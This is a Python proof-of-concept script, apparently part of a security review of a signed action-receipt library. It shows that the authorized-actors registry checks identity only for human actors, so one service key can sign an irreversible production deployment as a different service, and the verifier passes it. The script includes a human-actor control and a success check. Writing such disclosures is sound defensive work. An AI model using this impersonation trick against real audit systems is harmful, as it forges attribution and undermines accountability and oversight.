#!/usr/bin/env python3
"""poc_alpha_6 — authorized-actors registry: service identities are NOT
bound. The id-mismatch check is guarded by `actor.type == "human"`:

    if actor.get("type") == "human" and entry.get("id") != actor.get("id"):
        reasons.append(...)

For type="service" only the registry `type` field is compared. One enrolled
service key can therefore attribute its actions to ANY service identity —
"svc-backup-agent" signs a receipt as "svc-payments-deployer" — and the
registry check passes. The registry binds keys to identity for humans only;
for services it binds keys to the string "service".
"""
import sys
sys.path.insert(0, "/home/user/workspace/governance-as-code/tools")
from receipt_lib import (build_receipt, generate_keypair, verify_receipt,
                         keyid, sha256_hex)

POL = {"result": "ALLOW", "policy_hash": sha256_hex(b"policy-v1")}
EV = [{"id": "log", "sha256": sha256_hex(b"x"), "present": True}]

sk, pk = generate_keypair()
kid = keyid(pk)

# Out-of-band registry: THIS key belongs to the backup agent.
registry = {kid: {"id": "svc-backup-agent", "type": "service"}}

# The backup agent's key signs a receipt claiming to be the payments deployer.
impostor = {"type": "service", "id": "svc-payments-deployer",
            "is_service_account": True, "auth_method": "mtls"}
r = build_receipt(action_id="deploy-payments-9.9", subject_name="prod:payments",
                  actor=impostor, policy_decision=POL,
                  execution={"side_effect_class": "WRITE_IRREVERSIBLE", "status": "EXECUTED"},
                  evidence_items=EV, prev_chain_hash="GENESIS", signing_key=sk)

v = verify_receipt(r, pk, authorized_actors=registry)
print(f"[*] registry binds key {kid} -> 'svc-backup-agent'")
print(f"[*] receipt claims actor id 'svc-payments-deployer' (type service)")
print(f"[*] verdict={v.verdict}  reasons={v.reasons}")

# Control: same trick with type human is correctly caught (id checked there).
human_impostor = dict(impostor, type="human", is_service_account=False,
                      auth_method="oidc", human_principal="Mallory")
r2 = build_receipt(action_id="x", subject_name="prod:payments", actor=human_impostor,
                   policy_decision=POL,
                   execution={"side_effect_class": "READ_ONLY", "status": "EXECUTED"},
                   evidence_items=EV, prev_chain_hash="GENESIS", signing_key=sk)
registry_h = {kid: {"id": "alice", "type": "human"}}
v2 = verify_receipt(r2, pk, authorized_actors=registry_h)
print(f"[*] control (human id mismatch): verdict={v2.verdict} — correctly rejected: {v2.verdict == 'FAIL'}")

works = v.verdict == "PASS" and v2.verdict == "FAIL"
print("EXPLOIT-WORKS" if works else "HELD")
